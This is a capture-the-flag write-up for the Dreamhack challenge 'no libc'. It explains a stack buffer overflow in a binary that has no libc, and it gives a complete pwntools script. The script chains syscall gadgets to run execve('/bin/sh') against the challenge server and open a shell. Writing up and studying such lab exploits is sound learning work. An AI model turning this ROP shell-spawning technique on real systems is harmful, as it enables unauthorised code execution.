# Write-up of the challenge "no libc"

This challenge is part of the "Binary exploitation" category and is in **Level 1**.

# Goal of the challenge

The objective of this challenge is to rop the binary and spawn **system(binish)**.

## Program structure

```c
int64_t vuln()
{
    write("Input: ", 7);
    void var_48;
    return syscall3(0, 0, &var_48, 0x1f4);
}

int64_t _start()
{
    vuln();
    return syscall3(0x3c, 0, 0, 0);
}
```

## Security breach

The vulnerability here is **bof**.

## Solution

You don't have to be a genius to figure it out. In the source code they are literally writing `syscall3` so that means we can use `syscall gadgets`!
But first we need to check if the RELRO is partial then we can **rop**:

```
checksec nolibc
[*] '/mnt/d/chals/Dreamhack/pwn/no libc/deploy/nolibc'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Looks like we can actually rop so now we need to check if we have **/bin/sh** string or we need to write one in the **.bss** section:

```
 strings nolibc | grep 'bin'
/bin/sh
```

Looks like we have it also!

So now our picture is complete all we need to do is execute `syscall excev (59, '/bin/sh',0,0 )` and we should spawn a shell!
But before that let's find the **RIP**:

```
 RBP  0x6161616161616169 ('iaaaaaaa')

pwndbg> cyclic -o iaaaaaaa
Finding cyclic pattern of 8 bytes: b'iaaaaaaa' (hex: 0x6961616161616161)
Found at offset 64
pwndbg>
```

Notice how it was **RBP** that crashed which means we need to add an extra **8** bytes to reach **RIP**.

solve.py:

```
from pwn import *

# p = process("./nolibc")
p = remote("host8.dreamhack.games", 12395)

elf = ELF("./nolibc")
rop = ROP(elf)

syscall = rop.find_gadget(["syscall"])[0]
pop_rax_rdi = rop.find_gadget(["pop rax", "pop rdi", "ret"])[0]
pop_rsi_rdx = rop.find_gadget(["pop rsi", "pop rdx", "ret"])[0]

binish = next(elf.search(b'/bin/sh'))

offset = 64 + 8

payload = b'A' * offset
payload += p64(pop_rax_rdi)
payload += p64(59)
payload += p64(binish)
payload += p64(pop_rsi_rdx)
payload += p64(0)
payload += p64(0)
payload += p64(syscall)

p.sendline(payload)
p.interactive()

```
